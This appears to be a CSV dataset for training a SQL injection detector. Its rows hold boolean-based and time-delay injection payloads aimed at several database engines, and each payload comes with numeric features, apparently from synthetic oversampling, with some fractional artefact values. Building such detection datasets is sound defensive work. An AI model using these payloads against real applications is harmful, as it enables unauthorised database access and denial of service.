id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000156,attack,boolean,-3422%'  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  '%'  =  ',nearest_attack_euclidean,R000529,0.7916054454955215,148.81597735156555,36.481597735156555,4.153801763613105,56.92639094062622,18.0,49.88958641093933,24.0,0.38247465875313646,0.1213292855552092,0.3344236749513754,0.16177238074027891,8.0,0.0,1.0,0.0,0.0,2.0,0.0,6.481597735156555,1.5184022648434454,0.0,0.0,7.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000157,attack,boolean,"-6123"" or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""zuzx""  =  ""zuzx",nearest_attack_euclidean,R000267,0.8380112467896195,135.67166354754778,37.21302973591778,4.407703907519558,60.83583177377389,18.0,37.62280203785611,19.21302973591778,0.44816595913031687,0.13328753366489948,0.27711848710323805,0.1414280201015456,4.196742566020555,3.2130297359177797,1.0,0.0,0.0,1.803257433979445,0.0,4.0,0.0,0.0,0.0,6.803257433979445,1.0,0.8032574339794449,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,1.0,0.0,0.0,1.0,0.8032574339794449,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.803257433979445
SMOTE_000158,attack,boolean,"1%""   )    )     (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000558,0.7363252402464514,325.6113039384587,39.1993350624436,3.8328912966834197,112.39202074932324,34.0,131.61462862624074,47.60465456289478,0.345644643766044,0.10446589963849663,0.4038079210739889,0.1460815355214705,0.0,3.9999999999999996,0.0,0.0,0.0,1.8006649375563972,0.0,27.202659750225585,1.6013298751127942,3.0,3.0,7.800664937556397,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,11.0
SMOTE_000159,attack,boolean,"1""   )    )    and 9198  =  9198--",nearest_attack_euclidean,R000512,0.7178745336674487,35.18549585150737,11.889121888630529,2.6643753311178737,3.0,9.0,17.185495851507376,6.0,0.0854825947720417,0.25644778431612514,0.4871044313677497,0.1709651895440834,0.0,0.7036260371231572,2.0,0.0,0.0,1.0,0.0,2.296373962876843,0.0,0.0,0.0,3.0,0.0,0.7036260371231573,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,1.0
SMOTE_000160,attack,boolean,1'   )    )    as stnn where 6160  =  6160 and 8881  =  7347--,nearest_attack_euclidean,R000443,0.002552424679108968,62.0,21.0,3.508821543875858,14.0,17.0,24.0,7.0,0.22580645161290322,0.27419354838709675,0.3870967741935484,0.11290322580645161,1.0,0.0,2.0,0.0,0.0,2.0,0.0,2.0,0.0,0.0,0.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000161,attack,boolean,"1%'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000311,0.688131632443576,119.54746942737357,30.0,3.5440445139745136,34.72711773635588,13.0,52.27458716372945,19.54576452728824,0.2913114292608398,0.10898709552553754,0.4361819105220069,0.16351956469161577,4.0,0.0,0.0,0.0,1.0,2.0,0.0,8.545764527288242,1.9999999999999998,1.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.7271177363558796,0.2728822636441207,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,4.0
SMOTE_000162,attack,boolean,"1%'  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000680,0.5324998093637819,100.73181468652373,30.48045559404288,3.6917901510553253,31.826818531347627,13.0,40.731814686523734,15.173181468652373,0.31650791999209116,0.12922680095220013,0.40356861098984564,0.15069666806586313,1.0,0.0,2.0,0.0,1.0,1.0,0.0,7.346362937304747,0.8268185313476264,1.0,1.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.8268185313476265,0.1731814686523735,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,3.0
SMOTE_000163,attack,boolean,"1  )   as zbha where 9700  =  9700 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000759,0.0788524052230144,136.23131814502707,36.185054516021665,3.809442122746531,42.18505451602166,23.0,53.953736370994584,17.092527258010833,0.3096293310433776,0.16884020038925623,0.3960793161568524,0.1254511524105138,2.0462636290054155,0.0,2.0,0.9999999999999999,0.0,2.0,0.0,9.0,0.0,0.0,1.0,5.0462636290054155,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.04626362900541525,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.046263629005415
SMOTE_000164,attack,boolean,"1""   )    )    and 7533  =  7533 and    (    (   ""rnni"" like ""rnni",nearest_attack_euclidean,R000113,0.20139556898037048,69.03484288676542,17.84301191299039,3.0952708357144463,18.50580714779424,9.674409530392316,31.348819060784628,9.505807147794236,0.2688954003954982,0.13946562825126335,0.4541805143233808,0.13745845702985765,0.0,3.9999999999999996,0.0,0.0,0.0,1.0,0.0,4.337204765196158,0.0,0.0,0.1686023825980787,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000165,attack,boolean,"1  )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000480,0.6441861109819103,236.46774421141208,35.46774421141206,3.6932443486585904,71.0,25.0,98.0,42.467744211412054,0.3002561985648366,0.10572401357916783,0.4144381332303379,0.17958165462565767,0.0,0.2338721057060298,2.0,0.0,0.0,1.0,0.0,23.0,0.23387210570602984,2.0,4.0,13.0,0.0,0.23387210570602984,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,8.0
SMOTE_000166,attack,boolean,1%'   )    )    and 7160  =  7249--,nearest_attack_euclidean,R000679,1.0437569943434062,31.073745739692924,15.018436434923231,3.148754782305773,3.0,9.0,13.0553093047697,6.018436434923235,0.09817858495335577,0.29453575486006733,0.41455650140936773,0.19272915877720914,1.0,0.0,2.0,0.0,0.0,1.0,0.0,1.5092182174616164,0.5092182174616164,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,1.0
SMOTE_000167,attack,boolean,"1"" and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",nearest_attack_euclidean,R000257,0.5680477653332616,248.04898569325164,31.585385712250158,3.727311183780032,51.73179999050074,71.0,96.34154284900063,28.975642853750266,0.20799950502121892,0.2868876883083452,0.3884002166665531,0.11671259000388276,0.0,1.5853857122501585,0.0,0.0,2.0,1.0,0.0,18.390257141500108,0.0,0.0,6.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,1.0,0.19512857075005285,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,7.195128570750052
SMOTE_000168,attack,boolean,"-8094  )   or elt  (  1032  =  1032,3623  )   and   (  4569  =  4569",nearest_attack_euclidean,R000755,0.216017000997637,65.1078532960822,22.365138528408288,3.4729411794560745,7.5767590189388585,23.153518037877717,26.730277056816576,7.64729918244905,0.11457341335467583,0.3593958319551808,0.408844742686942,0.11718601200320138,0.0,0.0,1.0,0.0,0.0,1.92945983648981,0.0,3.7883795094694293,0.0,0.0,0.9294598364898098,2.9294598364898103,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.9294598364898099,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,1.92945983648981
SMOTE_000169,attack,boolean,"-1064' or make_set  (  6439  =  2937,2937  )   and 'qojd'  =  'qojd",nearest_attack_euclidean,R000059,0.057138266975755414,67.53067242153844,28.053067242153844,4.093288048730165,20.0,16.0,20.424537937230745,11.106134484307686,0.29645019414018825,0.23716015531215062,0.30196367384448364,0.1644259767031774,4.0,0.0,1.0,0.0,0.0,2.0,0.0,2.1061344843076863,0.0,1.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000170,attack,boolean,"-8550""  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""kyad""  =  ""kyad",nearest_attack_euclidean,R000447,0.9198339549597333,367.9683766848553,31.00632466302894,3.2438862635541748,86.0126493260579,51.98735067394212,176.9683766848553,53.0,0.23409054626798542,0.14114313891632843,0.4806548270275076,0.1441114877881785,0.0,3.006324663028941,1.0,0.0,0.0,2.0,0.0,36.99367533697106,0.0,0.0,0.0,13.0,0.0,0.7515811657572353,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,17.0
SMOTE_000171,attack,boolean,"1' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'bkcs'  =  'bkcs",nearest_attack_euclidean,R000195,0.4317974129341564,123.25231707979033,33.25231707979032,3.849140211037429,43.00926831916129,15.0,47.49536584041935,17.747682920209677,0.34890786033999777,0.12170307132200008,0.3853801979112015,0.1440088704268007,6.0,0.0,0.0,0.9999999999999999,0.0,1.7476829202096762,0.0,8.0,0.0,0.0,1.0,2.747682920209676,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000172,attack,boolean,-3834'   )    )    as hhiy where 2086  =  2086 or 3038  =  3038,nearest_attack_euclidean,R000070,0.5672017258819336,62.35763359496633,20.64236640503367,3.422533130816443,13.214122135011223,19.35763359496633,24.0,5.785877864988777,0.21212710523046158,0.31015297475755343,0.3850308978097376,0.09268902220224734,1.0,0.0,0.7858778649887761,0.0,0.0,2.0,0.0,2.0,0.0,0.0,0.0,2.7858778649887763,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.2141221350112238,0.7858778649887763,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000173,attack,boolean,"1%'   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000537,0.5832947808046749,199.7363196885446,30.207858988329754,3.6215777552749557,104.30921743179914,11.376423035010742,61.25853821006445,22.792141011670246,0.5203812520170312,0.05706516978541566,0.3067255309155958,0.1158280472819573,4.0,0.0,0.0,0.0,1.0,2.0,0.0,7.584282023340495,1.9999999999999998,0.0,5.376423035010742,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,4.0
SMOTE_000174,attack,boolean,"1%' and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000564,0.008401456971218984,122.03595150727887,30.990195043469402,4.1041170937142555,62.99673168115647,10.0,30.03268318843533,19.006536637687066,0.5162292814090054,0.08194505638649151,0.24608090741838679,0.15574475478611635,1.0,0.0,2.0,0.0,1.0,1.0,0.0,4.006536637687066,1.0,5.0,4.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.996731681156467,0.003268318843532958,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,3.0
SMOTE_000175,attack,boolean,"1""  )   and 7533  =  7533 and   (  ""jfsw"" like ""jfsw",nearest_attack_euclidean,R000431,0.6551413518534025,62.79072027564001,20.6744200172275,3.5031740535131455,19.01163002584125,10.348840034455,24.744200172275,8.686050043068752,0.3137298068640625,0.16690091559315476,0.3819746895597024,0.13739458798308035,0.0,3.9999999999999996,0.0,0.0,0.0,1.0,0.0,3.3488400344550007,0.0,0.0,0.33721000861375017,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000176,attack,boolean,"1' in boolean mode  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  #",nearest_attack_euclidean,R000191,1.917229026119348,131.59478739254743,28.364310850877814,4.00383465759924,70.6840102653529,10.0,34.137543989036175,16.77323313815836,0.5369179952867624,0.07657483628287809,0.2590687924588199,0.12743837597153954,0.5910777127194538,0.0,0.0,0.0,1.0,1.0,0.0,4.5910777127194535,0.0,5.0,4.0,2.0,0.5910777127194538,0.0,0.0,0.5910777127194539,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,3.0
SMOTE_000177,attack,boolean,"1'   )    )     )   and make_set  (  7539  =  3946,3946  )   and    (    (     (  'qbpo'  =  'qbpo",nearest_attack_euclidean,R000401,0.1433865158428258,96.47391380183225,25.3364842616662,3.2514371295321003,20.53553898316634,12.73459370466648,47.46918740933296,15.73459370466648,0.2124531470084114,0.1318135106984348,0.49268469437097706,0.16304864792217671,4.0,0.0,0.0,0.0,0.0,2.0,0.0,7.86729685233324,0.0,0.9336484261666201,0.9336484261666201,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000178,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000279,0.16646038396708981,72.5766424916956,23.14233575083044,3.6667025526195753,21.0,13.0,26.86131399335648,11.71532849833912,0.2900951240866538,0.17958269586316664,0.3690015299284001,0.1613206501217795,4.0,0.0,0.0,0.0,0.0,2.0,0.0,3.7153284983391197,0.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000179,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000599,0.7380570736208102,114.03201088296194,27.62030936660953,3.584041753834504,36.40103122203176,13.770051561101589,46.47056717211747,17.390360927711118,0.31417096342513234,0.12323540356697911,0.41079280186849726,0.15180083113939127,3.2299484388984117,0.0,0.0,0.0,0.0,1.0,0.0,9.080206244406353,0.7700515611015882,0.7700515611015882,2.5401031222031762,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.2299484388984117,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7700515611015882,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000180,attack,boolean,"1%'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000731,0.04382189331988514,164.1471144109953,30.0,3.697272392164247,67.51669816623067,8.071073799083726,64.65884576439812,23.900496681282785,0.4108658826828502,0.04955557065286305,0.393890165333968,0.14568838133031875,4.0,0.0,0.0,0.0,1.0,2.0,0.0,9.94314096073302,1.9999999999999998,0.014214759816745026,1.985785240183255,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.985785240183255,0.014214759816745026,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,4.0
SMOTE_000181,attack,boolean,"1   )    )    and make_set  (  8554  =  3286,3286  )   and    (    (   7385  =  7385",nearest_attack_euclidean,R000313,0.03366444419478966,83.83792336671621,21.93516934668649,3.1876059698720836,12.870338693372979,21.0,40.0,9.967584673343245,0.15343813238035253,0.2505129007382398,0.4771674299775996,0.11888153690380807,0.0,0.0,0.0,0.0,0.0,2.0,0.0,6.0,0.0,0.967584673343245,1.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,2.0
SMOTE_000182,attack,boolean,"1'   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000723,0.5425739193912338,138.57423421558948,31.68856674687177,4.082678196129522,69.8199672281024,8.688566746871773,42.37713349374354,17.68856674687177,0.5036603850590311,0.06266037899771455,0.30598112487051043,0.12769811107274381,1.0,0.0,2.0,0.0,1.0,1.0,0.0,6.0,0.3114332531282278,0.0,2.688566746871772,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,3.0
SMOTE_000183,attack,boolean,"1""  )   where 7919  =  7919 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000314,0.014271721370806791,260.0,38.10375683904674,3.822102159230174,77.0,35.0,104.0,44.0,0.29615384615384616,0.1346153846153846,0.4,0.16923076923076924,0.0,1.0,2.0,0.0,0.0,2.0,0.0,23.0,0.0,2.0,4.0,14.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,-3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,-1.3877787807814457e-17,9.0
